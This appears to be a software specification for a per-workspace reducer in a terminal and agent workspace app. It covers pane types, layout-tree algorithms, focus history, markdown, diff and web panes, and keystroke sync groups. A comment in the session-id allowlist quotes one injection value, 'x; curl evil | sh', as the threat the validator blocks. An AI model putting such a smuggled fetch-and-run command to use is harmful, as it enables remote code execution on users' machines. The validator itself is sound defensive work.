# Workspace Feature: Behavioral Specification

Source of truth: `Nex/Features/Workspace/WorkspaceFeature.swift` (plus the model types it
depends on: `Pane.swift`, `PaneType.swift`, `PaneLayout.swift`, `WorkspaceColor.swift`,
`RepoAssociation.swift`, `GroupIcon.swift`, `WebPaneState.swift`,
`WorkspaceProfilesClient.swift`, and the sync-group surface of `SurfaceManager.swift`).

This document specifies the **per-workspace reducer**: the state a single workspace owns
and the exact behavior of every action it handles. In the current app there is one
`WorkspaceFeature` instance per workspace, addressed by the parent `AppReducer` via the
workspace's UUID. The TS daemon should reproduce this as a per-workspace state machine:
`(state, action) -> (state', effects[])`, where effects are async jobs (spawn a PTY,
run `git`, drive a web view, push a sync group to the input broadcaster) that may
dispatch follow-up actions.

Terminology used throughout:

- "visible panes": the `panes` collection, i.e. panes present in the layout tree.
- "parked panes": the `parkedPanes` collection, off-layout panes whose PTYs stay alive.
- "un-zoom restore" / `restoreZoomIfNeeded()`: a shared preamble used by many actions,
  defined in section 5.1.
- UUIDs are compared/stored as opaque identifiers; in JSON they are lowercase-hyphenated
  strings.

---

## 1. Data model

### 1.1 Enumerations

```ts
type PaneType = "shell" | "markdown" | "scratchpad" | "diff" | "web";

type PaneStatus = "idle" | "running" | "waitingForInput";

type AgentKind = "claude" | "codex";

type WorkspaceColor =
  | "red" | "orange" | "yellow" | "green" | "blue"
  | "purple" | "pink" | "gray" | "black" | "white";
// "black" and "white" render as adaptive monochromes in the UI (dark end vs light end
// of a neutral grey that flips with light/dark appearance) so they never vanish into
// the chrome. That is a rendering concern only; the stored value is the string.

type SplitDirection = "horizontal" | "vertical";
// horizontal = side by side (new pane to the right); vertical = stacked (new pane below).

type DropZone = "top" | "bottom" | "left" | "right";

type Direction = "left" | "right" | "up" | "down"; // spatial focus/move navigation

type PredefinedLayout =
  | "even-horizontal" | "even-vertical"
  | "main-horizontal" | "main-vertical" | "tiled";
// Cycle order is exactly this list order (index 0..4).
```

`GroupIcon` (used for the optional workspace avatar override):

```ts
type GroupIcon =
  | { kind: "systemName"; name: string }  // SF Symbol id, e.g. "star.fill"; tinted
  | { kind: "emoji"; emoji: string };     // single grapheme; renders untinted
// Storage encoding (DB TEXT column): "system:<name>" or "emoji:<grapheme>".
// Unknown prefix or empty payload parses to null (falls back to default rendering:
// first letter of the workspace name / tinted folder for groups).
```

### 1.2 AgentKind behavior

```ts
// Wire mapping for the `agent` field on lifecycle events:
// absent or unrecognized -> "claude" (backwards compat with pre-#101 CLIs).
// Case-insensitive: "Codex" -> "codex".
function agentKindFromWire(raw: string | undefined): AgentKind {
  const k = raw?.toLowerCase();
  return k === "codex" ? "codex" : "claude";
}

// Session-id safety allowlist. Session ids arrive over the local socket and are later
// TYPED INTO A SHELL (resume-on-restart / reopen). A hostile local sender could persist
// `x; curl evil | sh` otherwise. Only ASCII alphanumerics plus . _ -, length 1..128.
function isSafeSessionID(id: string): boolean {
  return id.length >= 1 && id.length <= 128 && /^[A-Za-z0-9._-]+$/.test(id);
}

// The shell command used to resume a session in a freshly spawned PTY.
// Returns null (resume silently skipped) when the id fails the allowlist.
function resumeCommand(kind: AgentKind, sessionID: string): string | null {
  if (!isSafeSessionID(sessionID)) return null;
  return kind === "claude"
    ? `claude --resume ${sessionID}`
    : `codex resume ${sessionID}`;
}
```

### 1.3 Pane

```ts
interface Pane {
  id: string;                       // UUID, immutable
  label: string | null;             // user/CLI-assigned name; used for --target lookup
  type: PaneType;                   // default "shell"
  title: string | null;             // live title (terminal OSC title, web tab title,
                                    // "diff: <scope>", file name for markdown)
  workingDirectory: string;         // default: user home directory
  gitBranch: string | null;         // last detected branch of workingDirectory
  status: PaneStatus;               // default "idle"
  filePath: string | null;          // markdown: the file; diff: optional scope path
  isEditing: boolean;               // markdown edit mode / scratchpad always true
  externalEditorCommand: string | null; // non-null while a markdown pane hosts $EDITOR
                                    // in a terminal surface. TRANSIENT (not persisted).
  scratchpadContent: string | null; // scratchpad text; persisted to DB, never to a file
  agentSessionID: string | null;    // last known agent session id (persisted)
  agentKind: AgentKind | null;      // last known agent CLI (persisted; null = never seen;
                                    // display fallback is "claude")
  markdownFontSize: number;         // default 14; in-memory only (but captured in
                                    // closed-pane snapshots so reopen keeps it)
  parkedSourcePaneID: string | null; // set on panes created by `kelpi open --here`:
                                    // points at the parked source pane. TRANSIENT.
  agentStartedAt: string | null;    // ISO timestamp; when the current run entered
                                    // "running". Drives the "claude · mm:ss" badge.
                                    // TRANSIENT (a restored running pane shows no timer
                                    // until the agent re-emits a start).
  backgroundTaskCount: number;      // default 0; Claude Code background units still in
                                    // flight after the last Stop. TRANSIENT.
  createdAt: string;                // ISO timestamp
  lastActivityAt: string;           // ISO timestamp; bumped on title/cwd changes
}

const DEFAULT_MARKDOWN_FONT_SIZE = 14;

// Derived:
const isUsingExternalEditor = (p: Pane) => p.externalEditorCommand !== null;
```

### 1.4 ClosedPaneSnapshot

Captured at close time so `reopenClosedPane` can rebuild the pane.

```ts
interface ClosedPaneSnapshot {
  workingDirectory: string;
  label: string | null;
  type: PaneType;
  filePath: string | null;
  scratchpadContent: string | null;
  agentSessionID: string | null;   // used ONLY to type the resume command; not restored
                                   // onto the reopened pane's state
  agentKind: AgentKind | null;     // picks `claude --resume` vs `codex resume`
  markdownFontSize: number;        // default 14
  webState: WebPaneState | null;   // web panes only; null for private web panes
                                   // (private tabs are deliberately dropped at close)
}
```

Not captured: `title`, `gitBranch`, `status`, `isEditing` (recomputed: scratchpads reopen
in edit mode), `backgroundTaskCount`, timestamps.

### 1.5 RepoAssociation

```ts
interface RepoAssociation {
  id: string;            // UUID
  repoID: string;        // UUID into the app-level repo registry
  worktreePath: string;
  branchName: string | null;
  isAutoDetected: boolean; // default false
}
```

### 1.6 PaneLayout (recursive tree)

The layout is a binary tree. Full algorithms live in the pane-layout subsystem doc, but
the workspace reducer's behavior depends on these exact semantics, so they are restated
here as a contract:

```ts
type PaneLayout =
  | { kind: "leaf"; paneID: string }
  | { kind: "split"; direction: SplitDirection; ratio: number; // first child's share
      first: PaneLayout; second: PaneLayout }
  | { kind: "empty" };
```

Operations the workspace reducer uses:

- `allPaneIDs(layout)`: DFS pre-order, `first` before `second`. This ordering defines
  focus-next/previous cycling and the "current order" fed into predefined layouts.
- `replacing(layout, paneID, replacement)`: replaces the leaf with that id by the given
  subtree; no-op if the id is not present.
- `removing(layout, paneID)`: the leaf becomes `empty`; a split with an empty child
  collapses to the surviving child (the surviving child keeps its own internal ratios;
  the removed split's ratio disappears). Removing the last leaf yields `empty`.
- `splitting(layout, paneID, direction, newPaneID)`: replaces `leaf(paneID)` with
  `split(direction, ratio: 0.5, first: leaf(paneID), second: leaf(newPaneID))`.
  The existing pane is always `first`, the new pane always `second` (right/bottom).
- `swappingLeaves(id1, id2)`: exchanges the two leaf ids; tree structure, directions and
  ratios are untouched. No-op when `id1 === id2` or an id is absent.
- `movingPane(paneID, targetID, zone)`:
  - no-op when `paneID === targetID`;
  - remove `paneID` (tree collapses), then replace `leaf(targetID)` with a new
    `split(zone.splitDirection, ratio: 0.5, ...)` where the moved pane is `first` for
    `left`/`top` zones and `second` for `right`/`bottom` zones.
  - `zone.splitDirection`: left/right -> horizontal, top/bottom -> vertical.
- `updatingSplitRatio(splitPath, ratio)`: see 1.7. Ratio clamps to `[0.1, 0.9]`.
- `ratio(atPath)`: read the stored first-child ratio at a split path; null if the path
  does not land on a split.
- `enclosingSplitPath(paneID)`: the path of the split whose DIRECT child is
  `leaf(paneID)`, plus whether the pane is the `first` child and the split's direction.
  Null if the pane is the sole root leaf or absent. (Backs `kelpi pane resize`: a pane's
  requested share maps to `ratio` when it is first, `1 - ratio` when second.)
- `nextPaneID(after)` / `previousPaneID(before)`: index in `allPaneIDs` +/- 1 with
  wraparound; null when the id is absent or there is only one pane.
- `neighborPaneID(of, inDirection)`: geometric neighbor. Computes every leaf's frame in
  a canonical 10000x10000 bounds (frames account for a 2px divider between siblings; the
  first child of a split gets `available * ratio` where
  `available = total - dividerThickness`). A candidate qualifies in direction `left` if
  `candidate.maxX <= source.minX + tolerance` (tolerance = dividerThickness + 1 = 3),
  and symmetrically for the other directions. Among qualifying candidates, pick minimal
  `distance = edgeGap + |midOrthogonal delta|`; ties break toward the top-left origin
  (smaller midY for left/right, smaller midX for up/down). Null when none qualify.

**Split-path encoding**: a split node is addressed by a string starting with `"d"`
(the root split), then one `"L"` or `"R"` per level: `L` descends into `first`, `R` into
`second`. Examples: `"d"` = root split; `"dL"` = root's first child (itself a split);
`"dRL"` = root's second child's first child. This is the same id the UI's divider drag
uses, and the same string `kelpi pane resize` reports as `split_path`.

**Predefined layouts** (`buildLayout(paneIDs)`; empty list -> `empty`, one id ->
`leaf`):

- `even-horizontal` / `even-vertical`: right-leaning comb. For N panes the first gets
  `ratio = 1/N` of the current level, the remainder recursively even-splits: pane i's
  final share is 1/N for all i. Directions all horizontal (columns) or all vertical
  (rows).
- `main-horizontal`: `split(vertical, ratio 0.6, first: leaf(main), second:
  evenSplit(horizontal, rest))`. Main pane on top at 60%, the rest in equal columns
  below.
- `main-vertical`: `split(horizontal, ratio 0.6, first: leaf(main), second:
  evenSplit(vertical, rest))`. Main pane on the left at 60%, the rest in equal rows on
  the right.
- `tiled`: recursive midpoint split alternating direction, starting horizontal:
  `mid = floor(N/2)`, `ratio = mid / N`, first half and second half recurse with the
  flipped direction.

The **first id** in the list passed to `buildLayout` is the "main" pane.

### 1.7 updatingSplitRatio semantics

```
updatingSplitRatio(layout, splitPath, newRatio):
  nav = splitPath without the leading "d"
  clamped = min(max(newRatio, 0.1), 0.9)
  walk the tree following nav (L -> first, R -> second):
    - if the current node is a leaf/empty at any point: return layout unchanged
    - when nav is exhausted at a split node: replace its ratio with `clamped`
      (children untouched)
```

The ratio stored is always the FIRST child's share of the available space. The clamp to
`[0.1, 0.9]` is enforced here (single choke point); the GUI divider drag, the
`updateSplitRatio` action, and `kelpi pane resize` all funnel through it.

### 1.8 WebPaneState (sidecar for `.web` panes)

Kept in a dictionary keyed by pane id, NOT on the Pane struct, so non-web code paths
never touch it. Persisted parts: `tabs`, `activeTabID`, `isPrivate` (the tab list
survives restart). Everything else is transient runtime state.

```ts
interface WebTab {
  id: string;      // UUID
  url: string;
  title: string;   // default ""
}
// Display label fallback chain: title -> URL host -> raw url -> "New Tab".

interface ConsoleLine {
  tabID: string;             // tab active when the line fired
  level: "log" | "debug" | "info" | "warn" | "error";
  message: string;           // pre-joined argument string
  url: string;
  lineNumber: number | null;
  columnNumber: number | null;
  capturedAt: string;        // ISO timestamp
}

interface InspectResult {
  tabID: string;
  selector: string; xpath: string; tag: string; elementID: string;
  outerHTML: string;
  attributes: Record<string, string>;
  rect: { x: number; y: number; width: number; height: number };
  text: string; contextHTML: string; url: string;
  capturedAt: string;
  comment: string;           // "" unless stamped by batch-annotate
}

interface BatchInspectItem { id: string; result: InspectResult; comment: string }

interface BatchInspectState {
  items: BatchInspectItem[];
  focusedItemID: string | null;  // bidirectional list<->page focus sync
  panelVisible: boolean;         // default true
}

interface WebPaneState {
  tabs: WebTab[];
  activeTabID: string | null;
  isPrivate: boolean;
  // transient:
  consoleBuffer: RingBuffer<ConsoleLine>;  // capacity 1000; oldest dropped when full,
                                           // drops counted in droppedSinceLastDrain
  inspectorArmed: boolean;                 // single-shot element picker armed
  pendingInspectSendTo: string | null;     // destination pane id for --send-to
  pendingInspectNonce: string | null;      // anti-spoof nonce checked on delivery
  inspectResultQueue: InspectResult[];     // cap 32, oldest dropped
  batchInspect: BatchInspectState | null;
  lastBatchTarget:                          // session-only memory of the last batch
    | { kind: "local" }                     // destination (not serialized)
    | { kind: "pane"; paneID: string }
    | null;
}

// Resolved active tab: the tab matching activeTabID, else tabs[0], else null.
// (activeTabID can be momentarily stale, e.g. right after a close.)
```

### 1.9 Workspace state

```ts
interface WorkspaceState {
  id: string;                        // UUID, immutable
  name: string;
  slug: string;                      // filesystem-safe, derived from name (see 3.1)
  color: WorkspaceColor;
  icon: GroupIcon | null;            // null -> first letter of name as avatar
  profileName: string | null;        // workspace profile (env-var set) assignment;
                                     // null == the built-in "default" baseline
  panes: Pane[];                     // ordered identified collection (append order);
                                     // lookup by id must be O(1)-ish
  layout: PaneLayout;
  focusedPaneID: string | null;
  focusHistory: string[];            // TRANSIENT; most-recent last; max 8; dedup
  repoAssociations: RepoAssociation[];
  recentlyClosedPanes: ClosedPaneSnapshot[]; // TRANSIENT; max 10; oldest dropped
  parkedPanes: Pane[];               // TRANSIENT; off-layout, PTYs alive
  webPanes: Record<string, WebPaneState>; // keyed by pane id (tabs part persisted)
  zoomedPaneID: string | null;       // TRANSIENT
  savedLayout: PaneLayout | null;    // TRANSIENT; pre-zoom layout
  searchingPaneID: string | null;    // TRANSIENT; pane with the find bar open
  searchNeedle: string;              // TRANSIENT; default ""
  searchTotal: number | null;        // TRANSIENT; match count
  searchSelected: number | null;     // TRANSIENT; 1-based selected match index
  currentLayoutIndex: number | null; // TRANSIENT; index into the predefined-layout
                                     // cycle, null = layout has been hand-modified
  createdAt: string;
  lastAccessedAt: string;
  labels: string[];                  // ordered, case-sensitively deduped tags
  isSyncInputActive: boolean;        // TRANSIENT; default false
  syncInputExcluded: Set<string>;    // TRANSIENT; default empty
}
```

**Persisted fields** (the restore constructor's exact parameter list): `id`, `name`,
`slug`, `color`, `icon`, `panes`, `layout`, `focusedPaneID`, `repoAssociations`,
`createdAt`, `lastAccessedAt`, `labels`, `webPanes` (tab list/active/private),
`profileName`. Everything else initializes to its default on restore.

Within `Pane`, the transient fields are `externalEditorCommand`, `parkedSourcePaneID`,
`agentStartedAt`, `backgroundTaskCount` (and `markdownFontSize` is documented as
in-memory only). `agentSessionID` and `agentKind` persist; note the app-level restore
flow clears `agentSessionID` after capturing resume tuples (see the app-reducer doc),
while `agentKind` is deliberately NOT cleared (it is a last-known display value).

### 1.10 Computed properties

```ts
// Panes that must mirror each other's keystrokes RIGHT NOW.
function syncedPaneIDs(s: WorkspaceState): Set<string> {
  if (!s.isSyncInputActive) return new Set();
  const candidates = s.panes
    .filter(p => p.type === "shell" && !s.syncInputExcluded.has(p.id))
    .map(p => p.id);
  // Fewer than two participants -> empty set (mirroring to nothing is pointless,
  // and a lone terminal must never "sync" to itself).
  return candidates.length >= 2 ? new Set(candidates) : new Set();
}
// Non-shell panes are excluded EVEN when they host a terminal surface (a markdown pane
// in $EDITOR mode hosts vim in a PTY; mirroring agent-prompt keystrokes into that
// editor would be a footgun).

function focusedPane(s: WorkspaceState): Pane | null {
  return s.focusedPaneID ? findVisible(s, s.focusedPaneID) : null;
}

// Count of in-progress agents: panes (visible AND parked) whose status != "idle"
// ("running" or "waitingForInput" both count). Drives the running-agents guard on
// workspace deletion (CLI --force gate, GUI "Delete anyway?" dialog) and the
// app-level active-agent summary.
function activeAgentCount(s: WorkspaceState): number {
  return [...s.panes, ...s.parkedPanes].filter(p => p.status !== "idle").length;
}
```

---

## 2. Construction

### 2.1 New workspace

```
newWorkspace(id = newUUID(), name, color = "blue", createdAt = now):
  slug = makeSlug(name, id)
  lastAccessedAt = createdAt
  paneID = newUUID()
  panes = [ defaultPane(paneID) ]      // shell pane, cwd = home dir, status idle
  layout = leaf(paneID)
  focusedPaneID = paneID
  (all other fields take their defaults from 1.9)
```

A brand-new workspace always has exactly one shell pane.

Color choice for an appended workspace (helper used by the caller): pick a uniformly
random `WorkspaceColor` EXCLUDING the color of the current last workspace in the list,
so neighbors in the sidebar are visually distinct; fall back to `"blue"` if the filter
somehow empties the pool.

### 2.2 Restore from persistence

The restore constructor takes the persisted fields verbatim (section 1.9) and does NOT
create a default pane. A persisted workspace can legitimately restore with zero panes
and an `empty` layout, or with `focusedPaneID = null`.

---

## 3. Pure helpers

### 3.1 makeSlug(name, id)

```
base = name.toLowerCase()
         .replace(/[^a-z0-9]+/g, "-")   // runs collapse to one hyphen
         .replace(/^-+|-+$/g, "")       // trim hyphens
suffix = first 8 chars of the UUID string, lowercased
return base === "" ? suffix : `${base}-${suffix}`
```

The suffix guarantees uniqueness across same-named workspaces. Recomputed on rename.

### 3.2 sanitizedGitName(name) -> string | null

Sanitizes a user-entered worktree/branch name into something safe as BOTH a path
component and a git ref. Unlike `makeSlug` it preserves case, slashes (for
`feature/foo`), dots, underscores, hyphens; an already-valid name is a fixed point.

```
s = name.replace(/[^A-Za-z0-9\/._-]+/g, "-")  // spaces & git-hostile chars -> "-"
s = s.replace(/-{2,}/g, "-")
s = s.replace(/\/{2,}/g, "/")
s = s.replace(/\.{2,}/g, ".")
s = trim leading/trailing characters from the set { -  /  .  _  space }
return s === "" ? null : s
```

Best-effort: it does not enforce every `git check-ref-format` rule (e.g. a mid-path
component starting with `.`); callers must still surface git's own rejection errors.

### 3.3 normalizeLabel(raw)

```
t = raw.trim()             // whitespace and newlines
return t.length <= 64 ? t : t.slice(0, 64)
```

An empty result means "ignore this label". Max length 64.

### 3.4 Profile assignment normalization

```
normalizedAssignment(raw: string | null): string | null
  t = raw?.trim()                    // spaces/tabs only (not newlines) in the original
  if (!t || t === "" || t === "default") return null
  return t
```

`null` IS the "default" profile: the built-in baseline that always exists. At PTY spawn
time the effective profile name is `profileName ?? "default"`, and the resolved env is
the profile's parsed vars from `~/.config/nex/config` plus a canonical
`NEX_PROFILE=<name>` marker merged last (so a config line spoofing NEX_PROFILE loses).
A named profile with no config definitions resolves to just the marker (logged as a
warning; the virtual `default` profile skips the warning).

### 3.5 Focus bookkeeping

```
setFocus(state, newID: string | null):
  cur = state.focusedPaneID
  if (cur !== null && cur !== newID):
    remove all occurrences of cur from state.focusHistory
    push cur onto the end
    if (state.focusHistory.length > 8) drop entries from the FRONT until length == 8
  state.focusedPaneID = newID
```

Used for EVERY focus change EXCEPT pane close (a closing pane is destroyed, not "left",
and must not land in its own history; close paths assign `focusedPaneID` directly).

```
popFocusFromHistory(state, excluding: string | null): string | null
  if (excluding) remove all occurrences of excluding from focusHistory
  while (focusHistory not empty):
    candidate = focusHistory.pop()          // most-recent first
    if (candidate is a VISIBLE pane id) return candidate
    // dead / parked entries are silently discarded
  return null
```

### 3.6 Pane lookup and mutation across lanes

```
paneAnywhere(state, id)  = visible pane with id, else parked pane with id, else null
mutatePane(state, id, f) = apply f to the pane wherever it lives; no-op if absent
```

Surface/agent lifecycle events target panes in EITHER lane (a parked pane's agent still
reports status). User commands (send/split/close/...) intentionally look only at the
visible lane; that filtering happens in the socket/App layer, not here.

### 3.7 syncWebPaneHeader(state, paneID)

```
ws = state.webPanes[paneID]; if none, return
newTitle = displayLabel(resolvedActiveTab(ws)) ?? "Web"
if (visible pane's title !== newTitle) mutatePane(paneID, p => p.title = newTitle)
```

Called after any change to `activeTabID` (open/close/select/cycle) so the pane header
updates immediately instead of waiting for the next observed title change from the
web view.

### 3.8 refreshSyncGroup(state) -> effect

Pushes the workspace's current `syncedPaneIDs` to the keystroke broadcaster:

```
effect: surfaceManager.setSyncGroup(workspaceID: state.id, paneIDs: syncedPaneIDs(state))
// setSyncGroup semantics: empty set REMOVES the workspace's entry entirely;
// non-empty replaces it wholesale.
```

Returned by any action that mutates `panes` or the sync fields (see 6 and 7.11).

---

## 4. The sync-input broadcast contract (external to the reducer)

The reducer owns the *membership*; the input layer owns the *mirroring*. Contract the
port must reproduce:

- Broadcaster state: `syncGroups: Map<workspaceID, Set<paneID>>`.
- `setSyncGroup(wsID, ids)`: empty -> delete entry; else replace.
- `isSyncing(paneID)`: true if the pane is in ANY group (drives the pane-header badge).
- `syncTargetIDs(sourcePaneID)`: union of all groups containing the source, minus the
  source itself. (In practice a pane is in at most one group since groups are keyed by
  workspace and panes belong to one workspace.)
- On a keystroke in a synced pane, mirror the identical key event to every target
  (best-effort; targets whose terminal is gone are skipped). Text-insertion payloads
  (paste, dictation, drag-drop) are mirrored as text via the same target set.
- Mirroring never echoes back to the source and never crosses workspaces.

---

## 5. Shared action preambles

### 5.1 restoreZoomIfNeeded()

Many actions begin with:

```
if (state.savedLayout !== null):
  state.layout = state.savedLayout
  state.zoomedPaneID = null
  state.savedLayout = null
```

i.e. any structural operation first exits zoom by restoring the pre-zoom layout. Actions
that DO run this preamble: `splitPaneAtPath`, `splitPane`, `closePane`,
`openMarkdownFile` (reuse branch only, see caveat in 7.4), `openDiffPane` (both
branches), `openWebPane` (both branches), `createScratchpad`, `cycleLayout`,
`selectLayout`. Actions that deliberately do NOT: `createPane` (empty-workspace path),
`movePane`, `movePaneInDirection` (guards `zoomedPaneID == null` instead and no-ops),
`updateSplitRatio`, `toggleZoomPane` (it IS the zoom toggle).

### 5.2 clearSearchIfTargets(paneID)

```
if (state.searchingPaneID === paneID):
  state.searchingPaneID = null
  state.searchNeedle = ""
  state.searchTotal = null
  state.searchSelected = null
```

### 5.3 Surface spawn effect (shell panes)

Creating a terminal-backed pane produces an async effect:

```
env = resolveProfileEnv(state.profileName ?? "default")   // section 3.4
spawnSurface(paneID, workingDirectory, backgroundOpacity: ghosttyConfig.backgroundOpacity,
             command?: string, env)
```

The env snapshot is taken at dispatch time (spawn-time only; live PTYs keep their birth
env). Every spawn path threads env, including lazy/fallback spawn paths in the view
layer; if any path skips it, profiles get flaky.

---

## 6. currentLayoutIndex rules (predefined-layout cycling state)

`currentLayoutIndex` remembers which predefined layout the workspace is currently "on"
so `cycleLayout` advances rather than restarts. It is `null` whenever the layout has
been modified by hand. Exact rules:

- SET (to the layout's index 0..4) by: `cycleLayout`, `selectLayout`.
- RESET to `null` by every structural mutation: `splitPaneAtPath`, `splitPane`,
  `openMarkdownFile`, `openDiffPane`, `openWebPane`, `createScratchpad`, `closePane`
  (both unpark and normal branches), `reopenClosedPane`, `updateSplitRatio`, `movePane`,
  `movePaneInDirection`.
- NOT touched by: `createPane` (quirk: it replaces the whole layout but leaves the index
  alone; harmless because it is only reachable on empty workspaces where the index is
  already null), `toggleZoomPane` (zoom is temporary; un-zooming restores the saved
  layout, and the index survives so cycling continues from where it was), focus actions,
  all non-structural actions.
- `kelpi pane resize` goes through the same `updateSplitRatio` semantics and therefore
  also resets the index (documented behavior: replicates the GUI divider drag).

---

## 7. Actions

Actions are grouped by concern. "Guard ... else no-op" means the action returns with no
state change and no effect.

### 7.1 Workspace metadata

**rename(newName)**
- `name = newName` (no trimming, no length limit).
- `slug = makeSlug(newName, id)` (recomputed; the old slug is not kept).

**setColor(color)** - sets `color`.

**setProfile(raw: string | null)**
- `profileName = normalizedAssignment(raw)` (3.4). Single choke point for socket, CLI
  and UI entry paths. Affects only panes spawned afterwards.

**addLabel(raw)**
- `n = normalizeLabel(raw)`; empty -> no-op.
- Append to `labels` only if not already present (case-sensitive exact match).

**removeLabel(label)** - remove all exact matches from `labels`.

**setLabels(raw: string[])**
- Normalize each entry; drop empties; dedupe keeping FIRST occurrence order;
  replace `labels` wholesale.

### 7.2 Pane creation: createPane / splitPane / splitPaneAtPath

**createPane(newPaneID?: string, label?: string, workingDirectory?: string)**

Purpose: lay out the FIRST pane of an empty workspace (CLI `kelpi pane create` into an
empty workspace). All parameters default to null for legacy callers.

```
id = newPaneID ?? newUUID()
resolvedDir = (workingDirectory is non-null AND non-empty) ? workingDirectory
              : defaultHomeDirectory
pane = shellPane(id, label, resolvedDir)
panes.push(pane)
layout = leaf(id)                    // UNCONDITIONAL REPLACEMENT of the whole layout
setFocus(id)
effect: spawn surface (5.3) for id at resolvedDir
```

WARNING / invariant: `createPane` blindly replaces the layout with a single leaf. It is
only correct when the workspace is empty (no visible panes). Dispatching it on a
populated workspace would orphan every existing pane from the layout (they remain in
`panes` but are unreachable). Callers (socket handler for `pane create`) must route
populated workspaces to `splitPane`/`splitPaneAtPath` instead; the port should either
preserve this caller contract or add a guard.

`newPaneID` threading (issue #117): the CLI mints the id, replies to the client with it
immediately, and passes it in so the created pane really has that id. The same
`newPaneID` parameter exists on `splitPane` and `splitPaneAtPath` for the same reason,
so `kelpi pane split` / `pane create` always return the REAL new pane id.

**splitPane(direction, sourcePaneID?: string, label?: string, newPaneID?: string)**

Splits an existing pane; the new pane inherits the source pane's working directory.

```
restoreZoomIfNeeded()
sourceID = sourcePaneID ?? focusedPaneID;  guard sourceID != null else no-op
guard sourcePane = visible pane with sourceID else no-op   // parked panes NOT eligible
id = newPaneID ?? newUUID()
pane = shellPane(id, workingDirectory: sourcePane.workingDirectory)
layout = splitting(layout, sourceID, direction, id)   // ratio 0.5, new pane second
panes.push(pane)
if (label != null) pane.label = label
setFocus(id)
currentLayoutIndex = null
effect: spawn surface (5.3) for id at pane.workingDirectory
```

**splitPaneAtPath(path, label?: string, direction = "horizontal", newPaneID?: string)**

Same as splitPane but the new pane's working directory is the given path, and the split
source is ALWAYS the focused pane:

```
restoreZoomIfNeeded()
guard sourceID = focusedPaneID else no-op
// note: does NOT verify the focused pane exists in `panes` or in the layout;
// if focusedPaneID is stale the split is a structural no-op but the new pane is
// still appended (orphaned). Invariant: focusedPaneID must always be a live leaf.
id = newPaneID ?? newUUID()
pane = shellPane(id, workingDirectory: path)
layout = splitting(layout, sourceID, direction, id)
panes.push(pane); apply label; setFocus(id); currentLayoutIndex = null
effect: spawn surface (5.3)
```

### 7.3 Scratchpad

**createScratchpad**

```
id = newUUID()
pane = { id, type: "scratchpad", title: "Scratchpad", isEditing: true,
         workingDirectory: home, createdAt/lastActivityAt: now }
if (focusedPaneID != null):
  restoreZoomIfNeeded()
  layout = splitting(layout, focusedPaneID, "horizontal", id)
else:
  layout = leaf(id)
panes.push(pane); setFocus(id); currentLayoutIndex = null
// no surface, no effects
```

**scratchpadContentChanged(paneID, content)** - set `scratchpadContent` on the VISIBLE
pane only (no parked-lane fallback); no-op if absent. Content is persisted to the DB,
never written to a file.

### 7.4 Markdown panes

**openMarkdownFile(filePath, reusePaneID?: string)**

Converging entry point for GUI file-open (picker, drag-drop, Finder Open With) and the
CLI `kelpi open` / `kelpi md` markdown route. `reusePaneID` is the `--here` flow: replace
the calling pane in the layout and PARK it (keep its PTY alive) so closing the markdown
pane restores the terminal.

```
id = newUUID()                                 // never injected
dir = dirname(filePath); fileName = basename(filePath)
pane = { id, type: "markdown", label: fileName, title: fileName,
         workingDirectory: dir, filePath, createdAt/lastActivityAt: now }
branchEffect = async: b = gitCurrentBranch(dir) catch null
               dispatch paneBranchChanged(id, b)

if (reusePaneID != null AND oldPane = visible pane with reusePaneID):
  clearSearchIfTargets(reusePaneID)
  restoreZoomIfNeeded()
  pane.parkedSourcePaneID = reusePaneID
  layout = replacing(layout, reusePaneID, leaf(id))
  remove oldPane from panes; parkedPanes.push(oldPane); panes.push(pane)
  setFocus(id); currentLayoutIndex = null
  return branchEffect
// a reusePaneID that names no visible pane falls through to the split path below

sourceID = focusedPaneID ?? allPaneIDs(layout)[0]   // fallback guards the cold-launch
                                                    // file-open drain from clobbering a
                                                    // restored layout whose focus is null
if (sourceID != null):
  layout = splitting(layout, sourceID, "horizontal", id)
else:
  layout = leaf(id)          // only a genuinely empty layout becomes a bare leaf
panes.push(pane); setFocus(id); currentLayoutIndex = null
return branchEffect
```

Caveat (faithful to current behavior): the split branch does NOT run
restoreZoomIfNeeded(). Opening a markdown file while zoomed splits the zoomed leaf; the
stale `savedLayout` (which lacks the markdown pane) is still restored by the next
un-zoom-restoring action, which silently drops the markdown pane from the layout while
leaving it in `panes`. The port may fix this by adding the restore, but note the
divergence.

**toggleMarkdownEdit(paneID)** (bound to a key, markdown panes only)

```
guard pane = visible pane with paneID AND pane.type === "markdown" else no-op

if (pane.isEditing):                       // edit -> view
  wasExternal = pane.externalEditorCommand != null
  pane.isEditing = false; pane.externalEditorCommand = null
  if (wasExternal) effect: destroySurface(paneID)   // tears down the $EDITOR PTY
  return

// view -> edit
wasSearching = (searchingPaneID === paneID)
if (wasSearching) clearSearchIfTargets(paneID)      // the preview is being replaced;
                                                    // a floating find bar would no-op
cmd = pane.filePath ? editorService.buildCommand(pane.filePath) : null
// buildCommand: resolves the user's $VISUAL/$EDITOR (and login PATH) from a cached
// background resolution; returns a POSIX shell command that opens the file (file path
// single-quote-escaped, editor run via `env PATH=...` so it is findable from an app
// bundle's minimal environment). Null when no editor resolves.
if (cmd != null):
  pane.isEditing = true; pane.externalEditorCommand = cmd
  effect: [ if wasSearching close the markdown find UI for paneID ]
          spawn surface (5.3) for THIS pane id, cwd = pane.workingDirectory,
          command = cmd     // the surface hosts the editor, not a shell
else:
  pane.isEditing = true; pane.externalEditorCommand = null   // built-in text editor
  if (wasSearching) effect: close the markdown find UI for paneID
```

**increaseMarkdownFontSize(paneID)** - guard visible, markdown, NOT editing;
`markdownFontSize = min(size + 1, 32)`.
**decreaseMarkdownFontSize(paneID)** - same guards; `max(size - 1, 8)`.
**resetMarkdownFontSize(paneID)** - same guards; set to 14.

### 7.5 Diff panes

**openDiffPane(repoPath, targetPath?: string, reusePaneID?: string)**

```
id = newUUID()
scopeName = (targetPath non-null and non-empty) ? basename(targetPath)
            : basename(repoPath)
pane = { id, type: "diff", label: scopeName, title: `diff: ${scopeName}`,
         workingDirectory: repoPath, filePath: targetPath ?? null,
         createdAt/lastActivityAt: now }
branchEffect = async git branch of repoPath -> paneBranchChanged(id, ...)

reuse branch: identical to openMarkdownFile's reuse branch (park the source).

split branch:
  guard sourceID = focusedPaneID else layout = leaf(id)   // NO allPaneIDs fallback here
  if sourceID: restoreZoomIfNeeded(); layout = splitting(layout, sourceID, "horizontal", id)
panes.push(pane); setFocus(id); currentLayoutIndex = null
return branchEffect
```

Rendering inputs (consumed by the diff view, not this reducer): `workingDirectory` is
the repo path, `filePath` the optional `git diff -- <path>` scope. The view refreshes
on focus regain and via a manual refresh control.

### 7.6 Web panes (opening plus the sidecar actions)

